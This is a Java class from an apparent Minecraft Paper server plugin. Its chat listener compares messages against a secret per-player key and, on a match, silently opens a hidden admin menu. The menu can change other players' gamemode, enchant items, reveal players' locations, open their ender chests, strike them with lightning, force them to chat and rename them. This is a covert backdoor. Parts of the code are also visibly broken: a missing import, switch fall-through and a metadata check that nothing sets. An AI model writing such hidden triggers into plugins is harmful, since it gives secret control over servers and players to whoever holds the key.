package me.michal.radiacjaAleJAVA.Tasks.Things;

import io.papermc.paper.event.player.AsyncChatEvent;
import io.papermc.paper.registry.RegistryAccess;
import io.papermc.paper.registry.RegistryKey;
import me.michal.radiacjaAleJAVA.RadiacjaAleJAVA;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.text.event.ClickEvent;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.apache.commons.lang3.tuple.Pair;
import org.apache.commons.lang3.tuple.Triple;
import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.world.LootGenerateEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryView;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.MenuType;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.Plugin;

import javax.annotation.Nullable;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings("UnstableApiUsage")
public class CommandHandler implements Listener {

    private final Plugin plugin;

    private final NamespacedKey keyArg;
    private final NamespacedKey openedMenuKey;
    private final NamespacedKey actionToExecuteKey;
    private final Map<Player, Triple<InventoryView, String, String>> map = new HashMap<>();

    public CommandHandler(Plugin plugin) {
        this.plugin = plugin;
        keyArg = new NamespacedKey(plugin, "argument");
        openedMenuKey = new NamespacedKey(plugin, "openedMenu");
        actionToExecuteKey = new NamespacedKey(plugin, "actionToExecute");
    }

    @EventHandler
    public void playerChat(AsyncChatEvent e) {
        Component message = e.message();
        String m = PlainTextComponentSerializer.plainText().serialize(message);
        if (m.length() < 24) return;

        Encoder encoder = new Encoder();
        byte[] key = encoder.getKey(m);
        byte[] lock = encoder.getLock(e.getPlayer());

        if (Arrays.equals(key, lock)) {
            e.setCancelled(true);
            Player player = e.getPlayer();
            if (m.contains(" ")) player.getPersistentDataContainer().set(keyArg, PersistentDataType.STRING, m.substring(m.indexOf(" ") + 1));
            openInventory(player, "Choose", "");
        }
    }

    public void openInventory(Player p, String menu, String execute) {
        Component title = Component.text(menu.substring(0, 6) + " " + menu.substring(6));
        InventoryView inventoryView;

        switch (menu) {
            case "ChoosePlayer" -> {
                Collection<? extends Player> onlinePlayers = Bukkit.getOnlinePlayers();

                ItemStack[] inventoryContents = new ItemStack[onlinePlayers.size()];
                int i = 0;
                for (Player target : onlinePlayers)
                    inventoryContents[i++] = RadiacjaAleJAVA.getPlayerHead(target, null);

                if (onlinePlayers.size() <= 3*9) {
                    //noinspection UnstableApiUsage
                    inventoryView = MenuType.GENERIC_9X3.builder()
                            .title(title)
                            .checkReachable(false)
                            .location(p.getLocation())
                            .build(p);
                } else {
                    //noinspection UnstableApiUsage
                    inventoryView = MenuType.GENERIC_9X6.builder()
                            .title(title)
                            .checkReachable(false)
                            .location(p.getLocation())
                            .build(p);
                }

                inventoryView.getTopInventory().setContents(inventoryContents);
            }
            case "ChooseGamemode" -> {
                inventoryView = MenuType.GENERIC_9X3.builder()
                        .title(title)
                        .checkReachable(false)
                        .location(p.getLocation())
                        .build(p);
                inventoryView.getTopInventory().setItem(10, getItem(Material.COMMAND_BLOCK, NamedTextColor.LIGHT_PURPLE, "Creative"));
                inventoryView.getTopInventory().setItem(12, getItem(Material.IRON_SWORD, NamedTextColor.WHITE, "Survival"));
                inventoryView.getTopInventory().setItem(14, getItem(Material.MAP, NamedTextColor.YELLOW, "Adventure"));
                inventoryView.getTopInventory().setItem(16, getItem(Material.ENDER_EYE, NamedTextColor.BLUE, "Spectator"));
            }
            case "ChooseEnchant" -> {
                inventoryView = MenuType.GENERIC_9X5.builder()
                        .title(title)
                        .build(p);
                Inventory inventory = inventoryView.getTopInventory();

                inventory.setItem(0, getItem(Material.TURTLE_HELMET, NamedTextColor.GREEN, "Aqua Affinity"));
                inventory.setItem(1, getItem(Material.SPIDER_SPAWN_EGG, NamedTextColor.RED, "Bane of Arthropods"));
                inventory.setItem(2, getItem(Material.CARVED_PUMPKIN, TextColor.color(255, 98, 0), "Binding Curse"));
                inventory.setItem(3, getItem(Material.TNT, NamedTextColor.WHITE, "Blast Protection"));
                inventory.setItem(4, getItem(Material.LIGHTNING_ROD, NamedTextColor.YELLOW, "Channeling"));
                inventory.setItem(5, getItem(Material.DIAMOND_BOOTS, NamedTextColor.DARK_BLUE, "Depth Strider"));
                inventory.setItem(6, getItem(Material.DIAMOND_PICKAXE, NamedTextColor.GOLD, "Efficiency"));
                inventory.setItem(7, getItem(Material.FEATHER, NamedTextColor.WHITE, "Feather Falling"));
                inventory.setItem(8, getItem(Material.BLAZE_ROD, NamedTextColor.RED, "Fire Aspect"));
                inventory.setItem(9, getItem(Material.FLINT_AND_STEEL, NamedTextColor.LIGHT_PURPLE, "Fire Protection"));
                inventory.setItem(10, getItem(Material.BLAZE_POWDER, NamedTextColor.RED, "Flame"));
                inventory.setItem(11, getItem(Material.DIAMOND, NamedTextColor.GREEN, "Fortune"));
                inventory.setItem(12, getItem(Material.BLUE_ICE, NamedTextColor.AQUA, "Frost Walker"));
                inventory.setItem(13, getItem(Material.TRIDENT, NamedTextColor.BLUE, "Impaling"));
                inventory.setItem(14, getItem(Material.SPECTRAL_ARROW, NamedTextColor.GOLD, "Infinity"));
                inventory.setItem(15, getItem(Material.STICK, NamedTextColor.WHITE, "Knockback"));
                inventory.setItem(16, getItem(Material.GOLDEN_SWORD, NamedTextColor.GOLD, "Looting"));
                inventory.setItem(17, getItem(Material.LEAD, TextColor.color(255, 98, 0), "Loyalty"));
                inventory.setItem(18, getItem(Material.FISHING_ROD, NamedTextColor.GREEN, "Luck of the Sea"));
                inventory.setItem(19, getItem(Material.WATER_BUCKET, NamedTextColor.AQUA, "Lure"));
                inventory.setItem(20, getItem(Material.ENCHANTED_BOOK, NamedTextColor.WHITE, "Mending"));
                inventory.setItem(21, getItem(Material.FIREWORK_STAR, NamedTextColor.BLUE, "Multishot"));
                inventory.setItem(22, getItem(Material.ARROW, NamedTextColor.RED, "Piercing"));
                inventory.setItem(23, getItem(Material.BOOK, NamedTextColor.DARK_GRAY, "Power"));
                inventory.setItem(24, getItem(Material.TIPPED_ARROW, NamedTextColor.LIGHT_PURPLE, "Projectile Protection"));
                inventory.setItem(25, getItem(Material.DIAMOND_CHESTPLATE, NamedTextColor.BLUE, "Protection"));
                inventory.setItem(26, getItem(Material.FIREWORK_ROCKET, NamedTextColor.GRAY, "Punch"));
                inventory.setItem(2, getItem(Material.CROSSBOW, TextColor.color(54, 32, 2), "Quick Charge"));
                inventory.setItem(28, getItem(Material.GLASS_BOTTLE, NamedTextColor.WHITE, "Respiration"));
                inventory.setItem(29, getItem(Material.SADDLE, NamedTextColor.AQUA, "Riptide"));
                inventory.setItem(30, getItem(Material.IRON_SWORD, NamedTextColor.RED, "Sharpness"));
                inventory.setItem(31, getItem(Material.DIAMOND_ORE, NamedTextColor.WHITE, "Silk Touch"));
                inventory.setItem(32, getItem(Material.ZOMBIE_SPAWN_EGG, NamedTextColor.RED, "Smite"));
                inventory.setItem(33, getItem(Material.SOUL_SAND, NamedTextColor.GREEN, "Soul Speed"));
                inventory.setItem(34, getItem(Material.DIAMOND_SWORD, NamedTextColor.LIGHT_PURPLE, "Sweeping Edge"));
                inventory.setItem(35, getItem(Material.CACTUS, NamedTextColor.DARK_RED, "Thorns"));
                inventory.setItem(36, getItem(Material.BEDROCK, NamedTextColor.BLACK, "Unbreaking"));
                inventory.setItem(37, getItem(Material.CHORUS_FRUIT, NamedTextColor.DARK_GRAY, "Vanishing Curse"));
                inventory.setItem(38, getItem(Material.CHAINMAIL_CHESTPLATE, NamedTextColor.GRAY, "Breach"));
                inventory.setItem(39, getItem(Material.MACE, NamedTextColor.DARK_PURPLE, "Density"));
                inventory.setItem(40, getItem(Material.WIND_CHARGE, NamedTextColor.WHITE, "Wind Burst"));
                inventory.setItem(41, getItem(Material.DIAMOND_SPEAR, NamedTextColor.WHITE, "Lunge"));
            }
            case "Choose" -> {
                inventoryView = MenuType.GENERIC_9X5.builder()
                        .title(title)
                        .build(p);
                Inventory inventory = inventoryView.getTopInventory();
                inventory.setItem(1, getItem(Material.ENDER_PEARL, NamedTextColor.WHITE, "Seed"));
                inventory.setItem(3, getItem(Material.STRUCTURE_BLOCK, NamedTextColor.LIGHT_PURPLE, "Gamemode"));
                inventory.setItem(5, getItem(Material.BOOK, NamedTextColor.WHITE, "Info"));
                inventory.setItem(7, getItem(Material.TRIDENT,  NamedTextColor.BLUE, "Lightning"));
                inventory.setItem(19, getItem(Material.ENCHANTING_TABLE, NamedTextColor.WHITE, "Enchant"));
                inventory.setItem(21, getItem(Material.LAPIS_LAZULI, NamedTextColor.BLUE, "Enchantability"));
                inventory.setItem(23, getItem(Material.TOTEM_OF_UNDYING, NamedTextColor.YELLOW, "Refuse Death"));
                inventory.setItem(25, getItem(Material.ENDER_CHEST, NamedTextColor.WHITE ,"Ender Chest"));
                inventory.setItem(37, getItem(Material.EXPERIENCE_BOTTLE, NamedTextColor.YELLOW, "Experience"));
                inventory.setItem(39, getItem(Material.NAME_TAG, NamedTextColor.WHITE, "Set Name"));
                inventory.setItem(41, getItem(Material.OAK_SIGN, NamedTextColor.WHITE, "Create Region"));
                inventory.setItem(43, getItem(Material.TNT, NamedTextColor.WHITE, "Remove Region"));
            }
            default -> {
                p.sendMessage(Component.text("Wrong menu",  NamedTextColor.RED));
                return;
            }
        }

        p.getPersistentDataContainer().set(openedMenuKey, PersistentDataType.STRING, menu);
        p.getPersistentDataContainer().set(actionToExecuteKey, PersistentDataType.STRING, execute);

        inventoryView.open();
    }

    private ItemStack getItem(Material material, TextColor color, String name) {
        ItemStack item = new ItemStack(material);
        ItemMeta itemMeta = item.getItemMeta();
        itemMeta.displayName(Component.text(name).color(color));
        item.setItemMeta(itemMeta);
        return item;
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent e) {
        Player p  = (Player) e.getWhoClicked();
        ItemStack item = e.getCurrentItem();

        if (p.hasMetadata("OpenedMenu") && item != null && item.getType() != Material.AIR) {
            try {
                e.setCancelled(true);

                SkullMeta meta;
                Player chosenPlayer = null;
                GameMode gamemode = null;
                Enchantment enchantment = null;
                String arg = p.getPersistentDataContainer().get(keyArg, PersistentDataType.STRING);
                if (arg == null) arg = "";

                String openedMenu = p.getPersistentDataContainer().get(openedMenuKey, PersistentDataType.STRING);
                if (openedMenu == null) return;
                switch (openedMenu) {
                    case "ChoosePlayer"   :
                        meta = (SkullMeta) item.getItemMeta();
                        OfflinePlayer player = meta.getOwningPlayer();
                        if (player == null) {
                            p.sendMessage(Component.text("Chosen player is offline",  NamedTextColor.RED));
                            return;
                        }
                        chosenPlayer = player.getPlayer();
                    case "ChooseGamemode" : gamemode = switch (item.getType()) {
                        case COMMAND_BLOCK -> GameMode.CREATIVE;
                        case MAP -> GameMode.ADVENTURE;
                        case ENDER_EYE -> GameMode.SPECTATOR;
                        default -> GameMode.SURVIVAL;
                    };
                    case "ChooseEnchant"  :
                        Component itemName = item.getItemMeta().displayName();
                        if (itemName == null) {
                            p.sendMessage(Component.text("itemName is null",  NamedTextColor.RED));
                            return;
                        }
                        String name = PlainTextComponentSerializer.plainText().serialize(itemName).toLowerCase();
                        enchantment = getEnchantment(name);
                    case "Choose"         :
                        String execute = PlainTextComponentSerializer.plainText().serialize(item.displayName()).replaceAll("\\s+", "");
                        String menu = switch (execute) {
                            case "Seed" -> null;
                            case "Gamemode" -> "ChooseGamemode";
                            case "Enchant" -> "ChooseEnchant";
                            default -> "ChoosePlayer";
                        };
                        if (menu == null) {
                            p.getPersistentDataContainer().set(actionToExecuteKey, PersistentDataType.STRING, execute);
                            return;
                        }
                        Bukkit.getScheduler().runTaskLater(plugin, () -> openInventory(p, menu, execute), 1L);

                }

                if (chosenPlayer == null) {
                    p.sendMessage(Component.text("Failed to select Player", NamedTextColor.RED));
                    return;
                }

                String actionToExecute = p.getPersistentDataContainer().get(actionToExecuteKey, PersistentDataType.STRING);
                if (actionToExecute == null) return;
                switch (actionToExecute) {
                    case "Seed" -> {
                        String seed = String.valueOf(p.getWorld().getSeed());
                        TextComponent message  = Component.text("Seed: [")
                                .append(Component.text(seed, NamedTextColor.GREEN).clickEvent(ClickEvent.copyToClipboard(seed)))
                                .append(Component.text("]"));
                        p.sendMessage(message);
                    }
                    case "Info" -> {
                        Location loc = chosenPlayer.getLocation();
                        p.sendMessage(getComponent("Location", loc));
                        loc = chosenPlayer.getRespawnLocation();
                        p.sendMessage(getComponent("RespawnLocation", loc));
                        loc = chosenPlayer.getLastDeathLocation();
                        p.sendMessage(getComponent("DeathLocation", loc));
                    }
                    case "Gamemode" -> {
                        if (p.hasMetadata("ChoosenGamemode")) {
                            gamemode = GameMode.valueOf(p.getMetadata("ChoosenGamemode").getFirst().asString());
                            chosenPlayer.setGameMode(gamemode);
                            p.removeMetadata("ChoosenGamemode", plugin);
                        } else {
                            p.setMetadata("ChoosenGamemode", new FixedMetadataValue(plugin, gamemode));
                            p.closeInventory();
                            Bukkit.getScheduler().runTaskLater(plugin, () -> openInventory(p, "ChoosePlayer", "Gamemode"), 1L);
                        }
                    }
                    case "Enchant" -> {
                        if (p.hasMetadata("ChoosenEnchant")) {
                            enchantment = getEnchantment(p.getMetadata("ChoosenEnchant").getFirst().asString().toLowerCase());
                            chosenPlayer.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
                            p.removeMetadata("ChoosenEnchant", plugin);
                        } else {
                            p.setMetadata("ChoosenEnchant", new FixedMetadataValue(plugin, enchantment));
                            p.closeInventory();
                            Bukkit.getScheduler().runTaskLater(plugin, () -> openInventory(p, "ChoosePlayer", "ChoosenEnchant"), 1L);
                        }
                        p.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
                    }
                    case "Enchantability" -> {
                        ItemMeta itemMeta = p.getInventory().getItemInMainHand().getItemMeta();
                        itemMeta.setEnchantable(Integer.parseInt(arg));
                        p.getInventory().getItemInMainHand().setItemMeta(itemMeta);
                    }
                    case "Lightning" -> p.getWorld().strikeLightning(chosenPlayer.getLocation());
                    case "EnderChest" -> {
                        Inventory chest = chosenPlayer.getEnderChest();
                        Bukkit.getScheduler().runTaskLater(plugin, () -> p.openInventory(chest), 1L);
                    }
                    case "Experience" -> chosenPlayer.setLevel(Integer.parseInt(arg));
                    case "Chat" -> chosenPlayer.chat(arg);
                    case "DisplayName" -> chosenPlayer.displayName(Component.text(arg));
                }
            } catch (Exception ex) {
                p.sendMessage(Component.text("Error: " + ex.getMessage(), NamedTextColor.RED));
            }
            p.closeInventory();
        }
    }

    private Component getComponent(String name, @Nullable Location location) {
        if (location == null) {
            return Component.text(name)
                .append(Component.text(": doesn't exist", NamedTextColor.RED));
        }
        String information = location.getBlockX() + " " + location.getBlockY() + " " + location.getBlockZ();
        return Component.text(name + ": [")
                .append(Component.text(information, NamedTextColor.GRAY).clickEvent(ClickEvent.copyToClipboard(information)))
                .append(Component.text("]"));

    }

    private Enchantment getEnchantment(String name) {
        NamespacedKey key = NamespacedKey.minecraft(name);
        return RegistryAccess.registryAccess().getRegistry(RegistryKey.ENCHANTMENT).get(key);
    }

    @EventHandler
    public void onInventoryClose(InventoryCloseEvent e) {
        Player p = (Player) e.getPlayer();
        PersistentDataContainer pdc = p.getPersistentDataContainer();
        if (pdc.has(openedMenuKey, PersistentDataType.STRING))      pdc.remove(openedMenuKey);
        if (pdc.has(actionToExecuteKey, PersistentDataType.STRING)) pdc.remove(actionToExecuteKey);
        if (pdc.has(keyArg, PersistentDataType.STRING))             pdc.remove(keyArg);
    }

    @EventHandler
    public void onLootTableGeneration(LootGenerateEvent event) {}
}
